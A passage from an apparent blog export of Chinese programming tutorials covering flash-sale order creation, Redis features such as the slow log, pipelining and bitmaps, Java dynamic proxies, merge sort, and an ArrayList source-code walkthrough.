对于创建订单：先是普通的order_info表插入，还有一个是miaosha_order表插入，那么就要在一个事务中执行。 123456789101112131415161718192021222324@Transactionalpublic OrderInfo createOrder(MiaoshaUser user, GoodsVo goods) &#123; OrderInfo orderInfo = new OrderInfo(); orderInfo.setCreateDate(new Date()); orderInfo.setDeliveryAddrId(0L); orderInfo.setGoodsCount(1); orderInfo.setGoodsId(goods.getId()); orderInfo.setGoodsName(goods.getGoodsName()); orderInfo.setGoodsPrice(goods.getMiaoshaPrice()); orderInfo.setOrderChannel(1); orderInfo.setStatus(Constants.OrderStatus.NOT_PAID.getStatus());//新建未支付 orderInfo.setUserId(user.getId()); orderDao.insert(orderInfo); MiaoshaOrder miaoshaOrder = new MiaoshaOrder(); miaoshaOrder.setGoodsId(goods.getId()); miaoshaOrder.setOrderId(orderInfo.getId()); miaoshaOrder.setUserId(user.getId()); orderDao.insertMiaoshaOrder(miaoshaOrder); return orderInfo;&#125; 对于，orderDao.insert(orderInfo)的具体实现： 12345@Insert("insert into order_info(user_id,goods_id,goods_name,goods_price,goods_count,order_channel,status,create_date) " + "values(#&#123;userId&#125;,#&#123;goodsId&#125;,#&#123;goodsName&#125;,#&#123;goodsPrice&#125;,#&#123;goodsCount&#125;,#&#123;orderChannel&#125;,#&#123;status&#125;,#&#123;" + "createDate&#125;)")@SelectKey(keyColumn = "id",keyProperty = "id",resultType = long.class,before = false,statement = "select last_insert_id()")long insert(OrderInfo orderInfo); 对于orderDao.insertMiaoshaOrder(miaoshaOrder)的具体实现： 12@Insert("insert into miaosha_order(user_id,goods_id,order_id)values(#&#123;userId&#125;,#&#123;goodsId&#125;,#&#123;orderId&#125;)")int insertMiaoshaOrder(MiaoshaOrder miaoshaOrder); 下单成功的话，就跳到订单详情页面： 1return "order_detail"; 否则跳到错误提示页面： 1return "miaosha_fail";]]></content>
      <tags>
        <tag>秒杀系统实战</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[3.redis其他的功能]]></title>
    <url>%2F2018%2F07%2F21%2F3.redis%E5%85%B6%E4%BB%96%E7%9A%84%E5%8A%9F%E8%83%BD%2F</url>
    <content type="text"><![CDATA[介绍redis其他重要功能。 一、慢查询日志1.1 什么是慢查询日志慢查询日志帮助开发和运维人员定位系统存在的慢操作。慢查询日志就是系统在命令执行前后计算每条命令的执行时间，当超过预设阀值，就将这条命令的相关信息（慢查询ID，发生时间戳，耗时，命令的详细信息）记录下来。 1.2 redis一条命令简单的生命周期 慢查询只会出现在【3.执行命令】这个阶段，即慢查询只记录命令执行时间，并不包括命令排队时间和网络传输时间。 1.3 慢查询配置参数 慢查询的预设阀值 slowlog-log-slower-than slowlog-log-slower-than参数就是预设阀值，单位是微秒,默认值是10000，如果一条命令的执行时间超过10000微妙(10毫秒)，那么它将被记录在慢查询日志中。 如果slowlog-log-slower-than的值是0，则会记录所有命令。 如果slowlog-log-slower-than的值小于0，则任何命令都不会记录日志。 redis的操作一般是微妙级，slowlog-log-slower-than不要设置太大，一般设置为1毫秒。支持动态设置。 慢查询日志的长度slowlog-max-len slowlog-max-len只是说明了慢查询日志最多存储多少条。Redis使用一个列表来存储慢查询日志，showlog-max-len就是列表的最大长度。当慢查询日志已经到达列表的最大长度时，又有慢查询日志要进入列表，则最早插入列表的日志将会被移出列表，新日志被插入列表的末尾。 默认是128，但是slowlog-max-len不要设置太小，可以设置为1000以上. 慢查询日志是一个先进先出队列，慢查询较多的情况下，可能会丢失部分慢查询命令，可以定期执行slow get命令将慢查询日志持久化到其他存储中。然后制作可视化界面查询。 1.4 慢查询日志的访问和管理 slowlog get [N] : N可选，代表获取的日志条数 slowlog len : 慢日志列表的当前长度 slowlog reset : 对列表做清理操作 二、pipeline2.1 为什么会出现Pipeline用普通的get和set，如果同时需要执行大量的命令，那就是等待上一条命令应答后再执行，这中间不仅仅多了RTT（Round Time Trip），而且还频繁的调用系统IO，发送网络请求。 对于多条命令不是有mget和mset吗？确实对于一批的get和set可以用mget和mset，但是它的问题在于如果我们需要同时传输get和hget呢？此时pipeline(流水线)就出现了。 所以流水线解决的问题是N条命令网络通信的减少。 为什么说网络耗费时间大呢？这里给出一个极端的例子。 pipeline与原生M操作的对比。 原生M操作是一个原子操作。 pipeline非原子命令。 当某个命令的执行需要依赖前一个命令的返回结果时，无法使用pipeline。 1mset a “a1” b “b” c “c1” mget a b c mget和mset命令也是为了减少网络连接和传输时间所设置的，其本质和pipeline的应用区别不大，但是在特定场景下只能用pipeline实现，例如：123get aset b ‘1’incr b pipeline适合执行这种连续，且无相关性的命令。 2.2 一个demo搭建一个quickstart的maven工程。过程略。 引入依赖： 12345&lt;dependency&gt; &lt;groupId&gt;redis.clients&lt;/groupId&gt; &lt;artifactId&gt;jedis&lt;/artifactId&gt; &lt;version&gt;2.9.0&lt;/version&gt;&lt;/dependency&gt; 直接再单元测试中进行测试：普通的直接hset 10000条数据： 1234567891011@Testpublic void test1()&#123; Jedis jedis = new Jedis("127.0.0.1",6379); long before = System.currentTimeMillis(); for(int i=0;i&lt;10000;i++)&#123; jedis.hset("hashkey"+i,"filed"+i,"value"+i); &#125; long after = System.currentTimeMillis(); System.out.println("一共耗时: "+(after-before)+"ms");&#125; 运行结果： 一共耗时: 1526ms 但是用pipeline后： 123456789101112131415@Testpublic void test2()&#123; Jedis jedis = new Jedis("127.0.0.1",6379); long before = System.currentTimeMillis(); //分为10次批量发送 for(int i=0;i&lt;10;i++)&#123; Pipeline pipeline = jedis.pipelined(); for(int j=1000*i;j&lt;(i+1)*1000;j++)&#123; pipeline.hset("hashkey:"+j,"field:"+j,"value:"+j); &#125; pipeline.syncAndReturnAll(); &#125; long after = System.currentTimeMillis(); System.out.println("使用pipeline一共耗时: "+(after-before)+"ms");&#125; 运行结果：使用pipeline一共耗时: 139ms 可以预见，对于更多的传输次数，pipeline的优势将越来越明显。但是pipeline每次只能作用在一个redis节点上。 三、发布订阅3.1 角色发布者—-频道—-订阅者 3.2 模型 注意，新订阅的，是不能收到之前的消息的。 与发布订阅模型很类似的是消息队列模型。 只有一个是可以收到消息的。 四、bitMap4.1 位图是什么就是通过一个bit位来表示某个元素对应的值或者状态,其中的key就是对应元素本身。我们知道8个bit可以组成一个Byte，所以bitmap本身会极大的节省储存空间。 Bitmap不是一个确切的数据类型，而是基于String类型定义的一系列面向位操作的方法。因为String是二进制安全的并且它们的最大长度是512MB，所以String类型很合适去作为一个2^32长度的位数组。 比如我们执行 set hello big 那么这个big其实是这个形态： 执行getbit hello 0 得到0； 执行getbit hello 1 得到1 setbit hello 7 1，那么再get hello 将得到cig 4.2 位图有什么用呢？位图除了getbit和setbit之外，还有bitcount key [start end]，就是获取执行范围内的1的个数。 bitop作用是做多个Bitmap的and,or,not,xor操作。 以一个场景为例：日活跃用户 每次用户登录时会执行一次redis.setbit(daily_active_users, user_id, 1) 因为日活跃用户每天都变化，所以需要每天创建一个新的bitmap。我们简单地把日期添加到key后面，实现了这个功能。 第二个场景：用户签到情况 将那天所代表的网站的上线日作为offset参数， 比如,如果今天是网站上线的第100天,而用户$uid=10001在今天阅览过网站, 那么执行命令SETBIT peter 100 1. 如果明天$uid=10001也继续阅览网站,那么执行命令SETBIT peter 101 1 ,以此类推. 仔细想想，用位图，一天签到一次只要占一个bit，8天才占一个字节。那么一年这个用户签到占的数据是365/8=45.625个字节.如果不用位图实现，保存一条记录将远远大于一个比特吧，那么当用户量很大的时候，差距将会特别大。 五、hyperLogLog 基于HyperLogLog算法：极小空间完成独立数量统计。 本质还是字符串。 pfadd key element [element...]:向hyperloglog添加元素 pfcount key [key...]:计算hyperloglog的独立总数 pfmerge destkey sourcekey [sourcekey...]:合并多个hyperloglog api例子 为什么要用hyperLogLog呢我们上面例子可以看到，他的功能类似于去重，统计出所有不一样元素的个数。 他的优点是：占用内存极小。 缺点也有： 他可能会出错，错误率为0.81%，看你是否能够容忍错误了 不能拿到单条数据 六、geo存储经纬度、计算两地距离、范围计算等。 提到LBS(Location Based Service)，基于位置的服务。我立即想起Mongodb的GEO实现地理坐标查询等功能。 mongodb最大的特点是灵活，因为其数据是以json的格式存储，所以字段随时可以增加或减少；Redis的特点是快，适合单一的，简单的，大量数据的存储；HBase我没有做深入研究，它的特点是大，适合做离线缓存。在处理社交这种关系复杂的数据存储时，依然还是需要用mysql这种关系型数据库，nosql并不能完全替代。]]></content>
      <categories>
        <category>redis</category>
      </categories>
      <tags>
        <tag>redis学习</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[3.java动态代理]]></title>
    <url>%2F2018%2F07%2F21%2F3.java%E5%8A%A8%E6%80%81%E4%BB%A3%E7%90%86%2F</url>
    <content type="text"><![CDATA[学习了反射，我们知道反射可以生成动态代理类，代理模式也是比较重要的模式之一，那么就看看代理模式的基本思想以及如何用到反射的吧。 代理模式是什么定义：给某个对象提供一个代理对象，并由代理对象控制对于原对象的访问，即客户不直接操控原对象，而是通过代理对象间接地操控原对象。 RealSubject 是原对象（本文把原对象称为”委托对象”），Proxy 是代理对象。 Subject 是委托对象和代理对象都共同实现的接口。 Request() 是委托对象和代理对象共同拥有的方法。 结合生活理解代理模式要理解代理模式很简单，其实生活当中就存在代理模式： 我们购买火车票可以去火车站买，但是也可以去火车票代售处买，此处的火车票代售处就是火车站购票的代理，即我们在代售点发出买票请求，代售点会把请求发给火车站，火车站把购买成功响应发给代售点，代售点再告诉你。 但是代售点只能买票，不能退票，而火车站能买票也能退票，因此代理对象支持的操作可能和委托对象的操作有所不同。 Java实现静态代理示例1234567891011121314151617181920212223242526272829public class ProxyDemo &#123; public static void main(String args[])&#123; RealSubject subject = new RealSubject(); Proxy p = new Proxy(subject); p.request(); &#125;&#125;interface Subject&#123; void request();&#125;class RealSubject implements Subject&#123; public void request()&#123; System.out.println("request"); &#125;&#125;class Proxy implements Subject&#123; private Subject subject; public Proxy(Subject subject)&#123; this.subject = subject; &#125; public void request()&#123; System.out.println("PreProcess"); subject.request(); System.out.println("PostProcess"); &#125;&#125; 代理的实现分为： 静态代理 代理类是在编译时就实现好的。也就是说 Java 编译完成后代理类是一个实际的 class 文件。 动态代理 代理类是在运行时生成的。也就是说 Java 编译完之后并没有实际的 class 文件，而是在运行时动态生成的类字节码，并加载到JVM中。 Java 实现动态代理几个重要名词: 委托类和委托对象：委托类是一个类，委托对象是委托类的实例。 代理类和代理对象：代理类是一个类，代理对象是代理类的实例。 Java实现动态代理的大致步骤如下: 定义一个委托类和公共接口。 自己定义一个类（调用处理器类，即实现 InvocationHandler 接口），这个类的目的是指定运行时将生成的代理类需要完成的具体任务（包括Preprocess和Postprocess），即代理类调用任何方法都会经过这个调用处理器类（在本文最后一节对此进行解释）。 生成代理对象（当然也会生成代理类），需要为他指定(1)委托对象(2)实现的一系列接口(3)调用处理器类的实例。因此可以看出一个代理对象对应一个委托对象，对应一个调用处理器实例。 Java 实现动态代理主要涉及以下几个类: java.lang.reflect.Proxy: 这是生成代理类的主类，通过 Proxy 类生成的代理类都继承了 Proxy 类，即 DynamicProxyClass extends Proxy。 java.lang.reflect.InvocationHandler: 这里称他为”调用处理器”，他是一个接口，我们动态生成的代理类需要完成的具体内容需要自己定义一个类，而这个类必须实现 InvocationHandler 接口。 Proxy 类主要方法为：12//创建代理对象 static Object newProxyInstance(ClassLoader loader,Class&lt;?&gt;[] interfaces,InvocationHandler h) 这个静态函数的第一个参数是类加载器对象（即哪个类加载器来加载这个代理类到 JVM 的方法区） 第二个参数是接口（表明你这个代理类需要实现哪些接口） 第三个参数是调用处理器类实例（指定代理类中具体要干什么）。 这个函数是 JDK 为了程序员方便创建代理对象而封装的一个函数，因此你调用newProxyInstance()时直接创建了代理对象（略去了创建代理类的代码）。其实他主要完成了以下几个工作： 123456789static Object newProxyInstance(ClassLoader loader,Class&lt;?&gt;[] interfaces,InvocationHandler handler)&#123; //1. 根据类加载器和接口创建代理类 Class clazz = Proxy.getProxyClass(loader, interfaces); //2. 获得代理类的带参数的构造函数--反射 Constructor constructor = clazz.getConstructor(new Class[] &#123; InvocationHandler.class &#125;); //3. 创建代理对象，并制定调用处理器实例为参数传入 Interface Proxy = (Interface)constructor.newInstance(new Object[] &#123;handler&#125;);&#125; Proxy 类还有一些静态方法，比如： InvocationHandler getInvocationHandler(Object proxy): 获得代理对象对应的调用处理器对象。 Class getProxyClass(ClassLoader loader, Class[] interfaces): 根据类加载器和实现的接口获得代理类。 Proxy 类中有一个映射表，映射关系为：(&lt;ClassLoader&gt;,(&lt;Interfaces&gt;,&lt;ProxyClass&gt;) )，可以看出一级key为类加载器，根据这个一级key获得二级映射表，二级key为接口数组，因此可以看出：一个类加载器对象和一个接口数组确定了一个代理类。 我们写一个简单的例子来阐述 Java 实现动态代理的整个过程： 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647import java.lang.reflect.InvocationHandler;import java.lang.reflect.Method;import java.lang.reflect.Proxy;public class DynamicProxyDemo01 &#123; public static void main(String[] args) &#123; RealSubject realSubject = new RealSubject(); //1.创建委托对象 ProxyHandler handler = new ProxyHandler(realSubject); //2.创建调用处理器对象 Subject proxySubject = (Subject)Proxy.newProxyInstance(RealSubject.class.getClassLoader(), RealSubject.class.getInterfaces(), handler); //3.动态生成代理对象 proxySubject.request(); //4.通过代理对象调用方法 &#125;&#125;/** * 接口 */interface Subject&#123; void request();&#125;/** * 委托类 */class RealSubject implements Subject&#123; public void request()&#123; System.out.println("====RealSubject Request===="); &#125;&#125;/** * 代理类的调用处理器 */class ProxyHandler implements InvocationHandler&#123; private Subject subject; public ProxyHandler(Subject subject)&#123; this.subject = subject; &#125; @Override public Object invoke(Object proxy, Method method, Object[] args) throws Throwable &#123; System.out.println("====before===="); //定义预处理的工作，当然你也可以根据 method 的不同进行不同的预处理工作 Object result = method.invoke(subject, args); System.out.println("====after===="); return result; &#125;&#125; InvocationHandler 接口中有方法：invoke(Object proxy, Method method, Object[] args) 这个函数是在代理对象调用任何一个方法时都会调用的，方法不同会导致第二个参数method不同，第一个参数是代理对象（表示哪个代理对象调用了method方法），第二个参数是 Method 对象（表示哪个方法被调用了），第三个参数是指定调用方法的参数。 动态生成的代理类具有几个特点： 继承 Proxy 类，并实现了在Proxy.newProxyInstance()中提供的接口数组。 public final。 命名方式为 $ProxyN，其中N会慢慢增加，一开始是 $Proxy1，接下来是$Proxy2… 有一个参数为 InvocationHandler 的构造函数。这个从 Proxy.newProxyInstance() 函数内部的clazz.getConstructor(new Class[] { InvocationHandler.class }) 可以看出。 Java 实现动态代理的缺点：因为 Java 的单继承特性（每个代理类都继承了 Proxy 类），只能针对接口创建代理类，不能针对类创建代理类。 不难发现，代理类的实现是有很多共性的（重复代码），动态代理的好处在于避免了这些重复代码，只需要关注操作。 为了加深对动态代理的理解，再写一个例子。 假设模拟一个场景，买衣服，正常情况所有人买这件衣服要100块钱。 定义一个销售接口： 123public interface SaleService &#123; int getClothPrice(String brand);&#125; 一个具体的实现类： 1234567public class SaleServiceImpl implements SaleService&#123; @Override public int getClothPrice(String brand) &#123; //这里模拟一下是根据品牌的得到这件衣服的价格 return 100; &#125;&#125; 那么正常情况大家都要花100才能买这件衣服。但是现在对会员做活动，会员打5折。怎么做呢？正常思维是：增加一个接口，甚至更糟的想法是修改一下这个实现类，都是不好的，那么我们是否想过这样的方案：新建一个新的类，让这个代理类去做相应的逻辑呢？既不用修改原来的代码，而且还很简单就能实现。 现在写一个代理类： 123456789101112public class ProxySale &#123; public static &lt;T&gt; T getProxy(final int discount, final Class&lt;SaleServiceImpl&gt; implementClasses)&#123; return (T)Proxy.newProxyInstance(implementClasses.getClassLoader(), implementClasses.getInterfaces(), new InvocationHandler() &#123; @Override public Object invoke(Object proxy, Method method, Object[] args) throws Throwable &#123; //执行原来的方法，拿到原价，返回折扣价 int originPrice = (int) method.invoke(implementClasses.newInstance(),args); return originPrice-discount; &#125; &#125;); &#125;&#125; 那么调用的时候，一个是会员，一个是普通用户，根据身份调不同的方法即可： 123456789101112public class Main3 &#123; public static void main(String[] args) &#123; int discount = 50; SaleService saleService = ProxySale.getProxy(discount, SaleServiceImpl.class); int vipmoney = saleService.getClothPrice("耐克"); System.out.println("会员价格是："+vipmoney);//50 SaleService saleService1 = new SaleServiceImpl(); int money = saleService1.getClothPrice("耐克"); System.out.println("普通价格是："+money);//100 &#125;&#125; Java 动态代理的内部实现现在我们就会有一个问题： Java 是怎么保证代理对象调用的任何方法都会调用 InvocationHandler 的 invoke() 方法的？ 这就涉及到动态代理的内部实现。假设有一个接口 Subject，且里面有 int request(int i) 方法，则生成的代理类大致如下： 1234567891011public final class $Proxy1 extends Proxy implements Subject&#123; private InvocationHandler h; private $Proxy1()&#123;&#125; public $Proxy1(InvocationHandler h)&#123; this.h = h; &#125; public int request(int i)&#123; Method method = Subject.class.getMethod("request", new Class[]&#123;int.class&#125;); //创建method对象 return (Integer)h.invoke(this, method, new Object[]&#123;new Integer(i)&#125;); //调用了invoke方法--关键 &#125;&#125; 通过上面的方法就成功调用了 invoke() 方法。 有一篇文章比较生动地阐述了动态代理的含义：Java帝国之动态代理]]></content>
      <tags>
        <tag>java基础</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[2、归并排序]]></title>
    <url>%2F2018%2F07%2F21%2F2%E3%80%81%E5%BD%92%E5%B9%B6%E6%8E%92%E5%BA%8F%2F</url>
    <content type="text"><![CDATA[归并排序 1. 原理 归并排序（MERGE-SORT）是利用归并的思想实现的排序方法，该算法采用经典的分治（divide-and-conquer）策略（分治法将问题分(divide)成一些小的问题然后递归求解，而治(conquer)的阶段则将分的阶段得到的各答案”修补”在一起，即分而治之)。 复杂度为(nlogN),这里采用自顶向下和递归来完成的。 归并排序的原理是，先把待排序序列分为若干个子序列，每个子序列是有序的。然后再把有序子序列合并为整体有序序列。 归并的前提是先把要排序的序列分为若干个字序列，然后才归并。在拆分数列的时候，就要用到拆分，直到不能再拆为止。 如一个数列{9,8,7,6,5,4,3,2,1} 先分成{9,8,7,6,5}和{4,3,2,1} 然后再分成{9,8,7}和{6,5}和{4,3}和{2,1} 然后再分{9,8}、{6}、{5}、{4}、{3}、{2}、{1} 然后再合并起来，小在的前面，大的在后面，没有比较的在后面填充数列。 具体如何合并的呢？ 2. 代码2.1 左右分开12345678910111213public static void sort(int[] a, int low, int high) &#123; //int mid = (low + high) / 2; int mid = low + (high - low)/2; if (low &lt; high) &#123; //左边归并排序，使得左子序列有序 sort(a, low, mid); //右边归并排序，使得右子序列有序 sort(a, mid + 1, high); //将两个有序子数组合并操作 merge(a, low, mid, high); &#125;&#125; 2.2 合并1234567891011121314151617181920212223242526public static void merge(int[] a, int low, int mid, int high) &#123; int[] temp = new int[high - low + 1]; int i = low;// 左指针 int j = mid + 1;// 右指针 int k = 0;//临时指针 // 把较小的数先移到新数组中 while (i &lt;= mid &amp;&amp; j &lt;= high) &#123; if (a[i] &lt; a[j]) &#123; temp[k++] = a[i++]; &#125; else &#123; temp[k++] = a[j++]; &#125; &#125; // 把左边剩余的数移入数组 while (i &lt;= mid) &#123; temp[k++] = a[i++]; &#125; // 把右边边剩余的数移入数组 while (j &lt;= high) &#123; temp[k++] = a[j++]; &#125; // 把新数组中的数覆盖原数组 for (int k2 = 0; k2 &lt; temp.length; k2++) &#123; a[k2 + low] = temp[k2]; &#125;&#125; 3. 测试测试结果为：123456789101112131415161718192021SelectSort(随机无序) 共耗时：2913msSelectSort(近乎有序) 共耗时：2869msInsertionSort(未优化，随机无序) 共耗时：3861msInsertionSort(未优化，近乎有序) 共耗时：9msInsertionSort02(优化，随机无序) 共耗时：2891msInsertionSort02(优化，近乎有序) 共耗时：7msBubbleSort(随机无序) 共耗时：1265msShellSort(随机无序) 共耗时：24msShellSort(近乎有序) 共耗时：20msMergeSort(随机无序) 共耗时：22msMergeSort(近乎有序) 共耗时：70ms 可以看到，在有序的情况下，插入排序仍然是最强的，可以在这个点上对其进行优化。 这里尝试优化： 12345678910111213141516//用插入排序进行优化public static void sort02(int[] a, int low, int high) &#123; //int mid = (low + high) / 2; if(high - low &lt; 50)&#123; InsertSort.sort03(a, low, high); return; &#125; int mid = low + (high - low)/2; // 左边 sort(a, low, mid); // 右边 sort(a, mid + 1, high); // 左右归并 if(a[mid] &gt; a[mid+1]) merge(a, low, mid, high);&#125; 对应的插入排序方法是123456789101112//对array[l...r]范围的数组进行插入排序public static void sort03(int[] array,int low,int high)&#123; for(int i=low+1; i&lt;=high; i++)&#123; int tmp = array[i]; int j; for(j=i;j&gt;1&amp;&amp;array[j-1]&gt;tmp;j--)&#123; //将交换操作变为赋值，效率提高点 array[j] = array[j-1]; &#125; array[j] = tmp; &#125;&#125; 效果对比：1234567MergeSort(随机无序) 共耗时：22msMergeSort(近乎有序) 共耗时：70ms优化后的MergeSort(随机无序) 共耗时：16ms优化后的MergeSort(近乎有序) 共耗时：68ms 由此可见，性能稍微有些提高。]]></content>
      <tags>
        <tag>数据结构与算法</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[2、基于virtualbox+centos6.9的服务器搭建（一）]]></title>
    <url>%2F2018%2F07%2F21%2F2%E3%80%81%E5%9F%BA%E4%BA%8Evirtualbox%2Bcentos6.9%E7%9A%84%E6%9C%8D%E5%8A%A1%E5%99%A8%E6%90%AD%E5%BB%BA%EF%BC%88%E4%B8%80%EF%BC%89%2F</url>
    <content type="text"><![CDATA[网络配置好之后，就要安装服务发布的必要环境。 基于virtualbox+centos6.9的服务器搭建（一）—&gt;基于virtualbox+centos6.9的服务器搭建（一）&gt;]]></content>
      <tags>
        <tag>电商项目实战</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[2、ArrayList源码分析]]></title>
    <url>%2F2018%2F07%2F21%2F2%E3%80%81ArrayList%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90%2F</url>
    <content type="text"><![CDATA[本文分析ArrayList源码。 关注点 结论 ArrayList是否允许空 允许 ArrayList是否允许重复数据 允许 ArrayList是否有序 有序 ArrayList是否线程安全 非线程安全 1. 继承的父类和实现的接口12public class ArrayList&lt;E&gt; extends AbstractList&lt;E&gt; implements List&lt;E&gt;, RandomAccess, Cloneable, java.io.Serializable ArrayList 继承了 AbstractList 类，此类提供了 List 接口的骨干实现，继承此类的子类适合用于“随机访问”数据存储（如数组），Vector 也是此类的子类。 与 AbstractList 类对应的类是 AbstractSequentialList 类，继承该类的子类适合用于“连续访问”数据存储（如链接列表），代表的子类如 LinkedList 。 ArrayList 实现了 List 接口，List 接口通常表示一个列表（数组、队列、链表、栈等），其中的元素可以重复，代表的实现类有 ArrayList、LinkedList、Stack、Vector。 ArrayList 实现了 RandomAccess 接口，该接口为标记接口，用来表明其支持快速随机访问。 ArrayList 实现了 Cloneable 接口，以指示 Object.clone() 方法可以合法地对该类实例进行按字段复制。 ArrayList 实现了 Serializable 接口，因此它支持序列化，能够通过序列化传输。 2. 属性123456789101112//序列版本号private static final long serialVersionUID = 8683452581122892189L;//默认容量private static final int DEFAULT_CAPACITY = 10;//无参的空数组常量private static final Object[] EMPTY_ELEMENTDATA = &#123;&#125;;//有参的空数组private static final Object[] DEFAULTCAPACITY_EMPTY_ELEMENTDATA = &#123;&#125;;//存放元素的数组，从这可以发现ArrayList的底层实现就是一个Object数组transient Object[] elementData; //当前的实际元素个数private int size; 3. 构造函数123456789101112131415161718//用初始容量作为参数的构造方法public ArrayList(int initialCapacity) &#123; if (initialCapacity &gt; 0) &#123; //初始容量大于0，实例化数组 this.elementData = new Object[initialCapacity]; &#125; else if (initialCapacity == 0) &#123; //初始容量等于0，赋予空数组 this.elementData = EMPTY_ELEMENTDATA; &#125; else &#123; throw new IllegalArgumentException("Illegal Capacity: "+ initialCapacity); &#125;&#125;//无参的构造方法public ArrayList() &#123; this.elementData = DEFAULTCAPACITY_EMPTY_ELEMENTDATA;&#125; 从构造方法中我们可以看见，默认情况下，elementData是一个大小为0的空数组，当我们指定了初始大小的时候，elementData的初始大小就变成了我们所指定的初始大小了。 4. get，set方法123456789101112131415161718192021222324//返回指定索引的值public E get(int index) &#123; //检查索引值是否越界 rangeCheck(index); return elementData(index);&#125;private void rangeCheck(int index) &#123; if (index &gt;= size) throw new IndexOutOfBoundsException(outOfBoundsMsg(index));&#125;@SuppressWarnings("unchecked")E elementData(int index) &#123; return (E) elementData[index];&#125;//将制定索引上的值替换为新值，并返回旧值public E set(int index, E element) &#123; rangeCheck(index); E oldValue = elementData(index); elementData[index] = element; return oldValue;&#125; 因为ArrayList是采用数组结构来存储的，所以它的get方法非常简单，先是判断一下有没有越界，之后就可以直接通过数组下标来获取元素了，所以get的时间复杂度是O(1)。 set方法的作用是把下标为index的元素替换成element，跟get非常类似，所以就不在赘述了，时间复杂度度为O(1)。 5. add123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657//将指定的元素添加到列表的尾部public boolean add(E e) &#123; //动态数组 ensureCapacityInternal(size + 1); // Increments modCount!! elementData[size++] = e; return true;&#125;private void ensureCapacityInternal(int minCapacity) &#123; if (elementData == DEFAULTCAPACITY_EMPTY_ELEMENTDATA) &#123; minCapacity = Math.max(DEFAULT_CAPACITY, minCapacity); &#125; ensureExplicitCapacity(minCapacity);&#125;private void ensureExplicitCapacity(int minCapacity) &#123; modCount++; // overflow-conscious code if (minCapacity - elementData.length &gt; 0) grow(minCapacity);&#125;private void grow(int minCapacity) &#123; // overflow-conscious code int oldCapacity = elementData.length; //默认是扩大为原来的1.5倍 int newCapacity = oldCapacity + (oldCapacity &gt;&gt; 1); //1.5倍还是不够的话，直接用传进来的minCapacity作为容量值 if (newCapacity - minCapacity &lt; 0) newCapacity = minCapacity; //自己传进来的值minCapacity溢出的处理 if (newCapacity - MAX_ARRAY_SIZE &gt; 0) newCapacity = hugeCapacity(minCapacity); // minCapacity is usually close to size, so this is a win: //拷贝数据到新的扩容后数组中 elementData = Arrays.copyOf(elementData, newCapacity);&#125;private static int hugeCapacity(int minCapacity) &#123; if (minCapacity &lt; 0) // overflow throw new OutOfMemoryError(); return (minCapacity &gt; MAX_ARRAY_SIZE) ? Integer.MAX_VALUE : MAX_ARRAY_SIZE;&#125;//将元素添加到指定位置public void add(int index, E element) &#123; rangeCheckForAdd(index); ensureCapacityInternal(size + 1); // Increments modCount!! //arraycopy(被复制的数组，从第几个元素开始复制，要复制到的数组，从第几个元素开始粘贴，一共需要复制的元素个数) System.arraycopy(elementData, index, elementData, index + 1, size - index); elementData[index] = element; size++;&#125; ArrayList的add方法也很好理解，在插入元素之前，它会先检查是否需要扩容，然后再把元素添加到数组中最后一个元素的后面。在ensureCapacityInternal方法中，我们可以看见，如果当elementData为空数组时，它会使用默认的大小去扩容。所以说，通过无参构造方法来创建ArrayList时，它的大小其实是为0的，只有在使用到的时候，才会通过grow方法去创建一个大小为10的数组。 第一个add方法的复杂度为O(1)，虽然有时候会涉及到扩容的操作，但是扩容的次数是非常少的，所以这一部分的时间可以忽略不计。如果使用的是带指定下标的add方法，则复杂度为O(n)，因为涉及到对数组中元素的移动，这一操作是非常耗时的 grow方法是在数组进行扩容的时候用到的，从中我们可以看见，ArrayList每次扩容都是扩1.5倍，然后调用Arrays类的copyOf方法，把元素重新拷贝到一个新的数组中去。 6. remove123456789101112131415public E remove(int index) &#123; rangeCheck(index); modCount++; E oldValue = elementData(index); int numMoved = size - index - 1; if (numMoved &gt; 0) //arraycopy(被复制的数组，从第几个元素开始复制，要复制到的数组，从第几个元素开始粘贴，一共需要复制的元素个数) System.arraycopy(elementData, index+1, elementData, index, numMoved); elementData[--size] = null; // clear to let GC do its work return oldValue;&#125; remove方法与add带指定下标的方法非常类似，也是调用系统的arraycopy方法来移动元素，时间复杂度为O(n)。 7. size(),isEmpty()1234567public int size() &#123; return size;&#125;public boolean isEmpty() &#123; return size == 0;&#125; size方法非常简单，它是直接返回size的值，也就是返回数组中元素的个数，时间复杂度为O(1)。这里要注意一下，返回的并不是数组的实际大小。 8.indexOf()和lastIndexOf()12345678910111213141516171819202122232425public int indexOf(Object o) &#123; if (o == null) &#123; for (int i = 0; i &lt; size; i++) if (elementData[i]==null) return i; &#125; else &#123; for (int i = 0; i &lt; size; i++) if (o.equals(elementData[i])) return i; &#125; return -1;&#125;public int lastIndexOf(Object o) &#123; if (o == null) &#123; for (int i = size-1; i &gt;= 0; i--) if (elementData[i]==null) return i; &#125; else &#123; for (int i = size-1; i &gt;= 0; i--) if (o.equals(elementData[i])) return i; &#125; return -1;&#125; indexOf方法的作用是返回第一个等于给定元素的值的下标。它是通过遍历比较数组中每个元素的值来查找的，所以它的时间复杂度是O(n)。 lastIndexOf的原理跟indexOf一样，而它仅仅是从后往前找起罢了。 9. removeRange()12345678910111213141516//删除fromIndex到toIndex之间的全部元素protected void removeRange(int fromIndex, int toIndex)&#123; modCount++; //numMoved为删除索引后面的元素个数 int numMoved = size - toIndex; //将删除索引后面的元素复制到以fromIndex为起始位置的存储空间中去 System.arraycopy(elementData, toIndex, elementData, fromIndex,numMoved); int newSize = size - (toIndex-fromIndex); //将ArrayList后面(toIndex-fromIndex)个元素置为null for (int i = newSize; i &lt; size; i++) &#123; elementData[i] = null; &#125; size = newSize;&#125; 10. Vector vector因为很多方法都跟ArrayList一样，只是多加了个synchronized来保证线程安全罢了。如果照着ArrayList的方式再将一次就显得没意思了，所以只把Vector与ArrayList的不同点提一下就可以了。 Vector比ArrayList多了一个属性： protected int capacityIncrement; 这个属性是在扩容的时候用到的，它表示每次扩容只扩capacityIncrement个空间就足够了。该属性可以通过构造方法给它赋值。先来看一下构造方法：123456789101112131415public Vector(int initialCapacity, int capacityIncrement) &#123; super(); if (initialCapacity &lt; 0) throw new IllegalArgumentException("Illegal Capacity: "+initialCapacity); this.elementData = new Object[initialCapacity]; this.capacityIncrement = 